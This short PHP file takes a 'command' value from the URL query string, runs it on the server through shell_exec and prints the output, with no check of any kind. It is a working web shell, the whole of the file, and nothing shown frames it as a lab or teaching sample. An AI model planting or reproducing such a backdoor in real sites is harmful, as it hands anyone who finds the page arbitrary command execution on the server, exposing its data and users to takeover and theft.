<?php
    // Get the command parameter from the query string
    $command = $_GET['command'];

    // Execute the command and capture the output
    $output = shell_exec($command);

    // Output the result
    echo "<pre>$output</pre>";
?>
